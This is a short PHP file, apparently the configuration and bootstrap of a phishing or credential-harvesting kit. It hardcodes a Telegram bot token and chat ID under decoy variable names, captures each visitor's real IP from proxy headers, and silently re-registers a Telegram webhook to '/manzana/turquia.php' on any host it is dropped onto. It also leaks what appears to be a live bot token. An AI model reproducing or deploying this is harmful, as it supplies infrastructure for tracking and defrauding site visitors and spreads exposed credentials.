<?php
// Token y chat_id directamente
$ambar = "8703345346:AAG3REoqkwt9AFpK7_o4WPyjToMsBv9c984";
$koala = "-5414197578";

// IP real del cliente (Azure proxy envia X-Forwarded-For)
if (!function_exists('gip')) {
    function ip_yago() {
        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
            if (!empty($_SERVER[$h])) {
                $ip = trim(explode(',', $_SERVER[$h])[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            }
        }
        return '0.0.0.0';
    }
}

// Auto-registro del webhook con verificacion (self-healing)
// Verifica contra Telegram cada 10 min; si la URL registrada no
// coincide con el host actual, la re-registra y limpia la cola.
(function() use ($ambar) {
    if (PHP_SAPI === 'cli') return;
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if (!$host || strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) return;
    $flag = __DIR__ . '/.wh_' . substr(md5($ambar . $host), 0, 12) . '.ok';
    if (is_file($flag) && (time() - filemtime($flag) < 600)) return;
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
    $webhookUrl = $scheme . '://' . $host . '/manzana/turquia.php';
    $ctx = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true]]);
    $info = @file_get_contents("https://api.telegram.org/bot{$ambar}/getWebhookInfo", false, $ctx);
    $cur = '';
    if ($info) {
        $d = json_decode($info, true);
        $cur = $d['result']['url'] ?? '';
    }
    if ($cur === $webhookUrl) {
        @file_put_contents($flag, date('c'));
        return;
    }
    $api = "https://api.telegram.org/bot{$ambar}/setWebhook?" . http_build_query(['url' => $webhookUrl, 'drop_pending_updates' => 'true']);
    $resp = @file_get_contents($api, false, $ctx);
    if ($resp && strpos($resp, '"ok":true') !== false) {
        @file_put_contents($flag, date('c') . ' ' . $webhookUrl);
    }
})();

